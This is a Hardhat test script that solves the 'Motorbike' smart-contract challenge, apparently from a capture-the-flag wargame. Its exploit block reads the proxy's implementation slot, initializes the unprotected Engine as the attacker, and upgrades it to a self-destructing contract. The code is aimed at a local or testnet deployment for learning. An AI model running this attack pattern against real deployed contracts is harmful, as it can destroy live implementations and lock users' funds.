const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Motorbike', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const MotorbikeContractFactory = await ethers.getContractFactory('Motorbike');
            this.target = MotorbikeContractFactory.attach("");
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const EngineContractFactory = await ethers.getContractFactory('Engine', deployer);
            const MotorbikeContractFactory = await ethers.getContractFactory('Motorbike', deployer);
            this.engine = await EngineContractFactory.deploy();
            this.target = await MotorbikeContractFactory.deploy(this.engine.address);
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const EngineContractFactory = await ethers.getContractFactory('Engine');
        let engineSlot = await ethers.provider.getStorageAt(
            this.target.address, 
            "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
        );
        let engineAddress = ethers.utils.hexDataSlice(engineSlot, 12);
        this.engine = EngineContractFactory.attach(engineAddress);

        console.log(`\t Info...`);
        console.log(`\t target: ${this.target.address}`);
        console.log(`\t engine: ${this.engine.address}`);
        console.log(`\t engine upgrader: ${await this.engine.upgrader()}`);  

        console.log(`\t Initializing the engine...`);
        let initTX = await this.engine.connect(attacker).initialize({gasLimit:200000}); await initTX.wait(); 

        console.log(`\t Deploying destroyer...`);
        const EngineDestroyerFactory = await ethers.getContractFactory('EngineDestroyer', attacker);
        const EngineDestroyer = await EngineDestroyerFactory.deploy();

        console.log(`\t Destroying the engine...`);
        let ABI = ["function destroy()"];
        let iface = new ethers.utils.Interface(ABI);
        let data = iface.encodeFunctionData("destroy");
        let exploitTX = await this.engine.connect(attacker).upgradeToAndCall(
            EngineDestroyer.address, 
            data,{gasLimit:200000}
        ); await exploitTX.wait();
        
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await ethers.provider.getCode(this.engine.address)).to.be.eq("0x");
    });
});